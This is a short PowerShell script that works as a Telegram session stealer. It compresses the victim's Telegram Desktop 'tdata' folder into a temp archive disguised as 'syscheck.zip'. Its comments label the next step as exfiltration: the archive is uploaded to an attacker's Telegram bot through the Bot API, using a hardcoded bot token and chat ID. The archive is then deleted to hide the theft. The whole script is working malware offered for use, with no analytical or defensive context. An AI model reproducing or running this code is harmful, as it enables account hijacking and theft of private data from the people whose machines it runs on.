# 1. Define paths using native Windows environment variables
$tdataPath = "$env:APPDATA\Telegram Desktop\tdata"
$zipPath   = "$env:TEMP\syscheck.zip"

# 2. Check if the directory exists and compress it
if (Test-Path $tdataPath) {
    Compress-Archive -Path $tdataPath -DestinationPath $zipPath -Force

    # 3. Exfiltrate the file using native web request utilities
    $botToken = "8853091711:AAHXtKxyYTa91Xn0_Lgb4QXj0481ZRspQ4M"
    $chatId   = "8699240431"
    $url      = "https://api.telegram.org/bot$botToken/sendDocument"

    # Send the ZIP file natively via an HTTP POST request
    Invoke-RestMethod -Uri $url -Method Post -Form @{
        chat_id  = $chatId
        document = Get-Item $zipPath
    }

    # 4. Remove the temporary archive from the disk
    Remove-Item $zipPath -Force
}
